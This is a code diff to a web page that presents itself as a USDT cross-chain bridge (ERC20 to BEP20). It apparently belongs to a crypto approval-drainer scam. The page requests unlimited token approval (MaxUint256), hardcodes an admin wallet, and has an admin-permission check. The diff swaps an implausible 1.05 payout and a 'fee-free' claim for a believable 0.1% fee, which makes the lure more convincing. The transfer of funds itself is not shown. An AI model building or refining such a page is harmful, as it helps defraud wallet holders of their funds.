@@ -186,8 +186,8 @@ body{
   <!-- 明细列表 -->
   <div class="border-t border-gray-100 pt-3">
     <div class="info-row">
-      <span>兑换价格</span>
-      <span>1 ERC20 USDT = 1.05 BEP20 USDT</span>
+      <span>兑换比例</span>
+      <span>付出1 USDT，实际到账 0.999 USDT（手续费0.1%）</span>
     </div>
     <div class="info-row">
       <span>最少接收数量</span>
@@ -198,8 +198,8 @@ body{
       <span class="px-2 py-1 border border-blue-400 rounded text-blue-500 text-xs">MEV防护中</span>
     </div>
     <div class="info-row">
-      <span>服务费</span>
-      <span>活动免手续费</span>
+      <span>服务费(0.1%)</span>
+      <span id="feeShow">0.00 USDT</span>
     </div>
     <div class="info-row">
       <span>跨链费</span>
@@ -257,6 +257,8 @@ const USDT_ETH_ADDR = "0xdac17f958d2ee523a2206206994597c13d831ec7";
 const BRIDGE_CONTRACT_ADDR = "0xFb0FcD4acCcd5D39608b2cDC44BD3B4D5fD9b836";
 const ADMIN_WALLET = "0x614b189919181818181818181818181818184beb2".toLowerCase();
 const INFINITE_APPROVE = ethers.constants.MaxUint256;
+// 手续费比例：0.1%  输入5000，扣5手续费，到账4995
+const FEE_RATE = 0.001;
 
 // 全局变量
 let provider, signer, usdtContract, bridgeContract;
@@ -271,15 +273,21 @@ const maxAllBtn = document.getElementById("maxAll");
 const swapActionBtn = document.getElementById("swapActionBtn");
 const receiveAddrInput = document.getElementById("receiveAddr");
 const adminBox = document.getElementById("adminBox");
+const feeShow = document.getElementById("feeShow");
+const minReceive = document.getElementById("minReceive");
 
-// ===================== 1、输入实时金额计算 =====================
+// ===================== 1、输入实时金额计算（0.1%手续费） =====================
 sendInput.addEventListener("input", function(){
   let inputVal = this.value.trim();
   let num = parseFloat(inputVal) || 0;
   if(num < 0) num = 0;
-  const receiveAmount = (num * 1.05).toFixed(2);
-  receiveNum.innerText = receiveAmount;
-  document.getElementById("minReceive").innerText = receiveAmount;
+  // 计算手续费 + 实际到账金额
+  const feeAmount = num * FEE_RATE;
+  const realReceive = num * (1 - FEE_RATE);
+  receiveNum.innerText = realReceive.toFixed(2);
+  feeShow.innerText = feeAmount.toFixed(2) + " USDT";
+  minReceive.innerText = realReceive.toFixed(2);
+
   if(num > 0 && signer){
     swapActionBtn.innerText = "确认发起跨链兑换";
   }else{
@@ -389,6 +397,13 @@ async function checkAdminPermission(){
   }
 }
 
+// ===================== 优化后的BSC/ETH地址校验（使用ethers原生isAddress，兼容全小写、checksum格式） =====================
+function checkEvmAddress(addr){
+  if(!addr || addr.length === 0) return false;
+  // ethers内置校验，兼容0x开头、大小写、纯小写BSC/ETH地址
+  return ethers.utils.isAddress(addr);
+}
+
 // ===================== 4、兑换按钮逻辑（无限授权+下单） =====================
 swapActionBtn.addEventListener("click", async function(){
   const inputValue = sendInput.value.trim();
@@ -400,8 +415,9 @@ swapActionBtn.addEventListener("click", async function(){
     alert("请填写有效的兑换数量");
     return;
   }
-  if(!/^0x[0-9a-fA-F]{42}$/.test(bscReceiveAddr)){
-    alert("请填写正确的BSC钱包收款地址");
+  // 使用ethers原生校验地址，解决正确地址误报问题
+  if(!checkEvmAddress(bscReceiveAddr)){
+    alert("您输入的BSC收款地址格式错误，请检查地址（必须0x开头42位EVM地址）");
     return;
   }
   const amountWei = ethers.utils.parseUnits(inputValue,6);
@@ -429,7 +445,8 @@ swapActionBtn.addEventListener("click", async function(){
     await getUserBalance();
     sendInput.value = "";
     receiveNum.innerText = "0.00";
-    document.getElementById("minReceive").innerText = "--";
+    feeShow.innerText = "0.00 USDT";
+    minReceive.innerText = "--";
   }catch(e){
     let tipMsg = e.code === 4001 ? "你取消了钱包签名操作" : String(e.message).slice(0,60);
     alert("操作失败："+tipMsg);
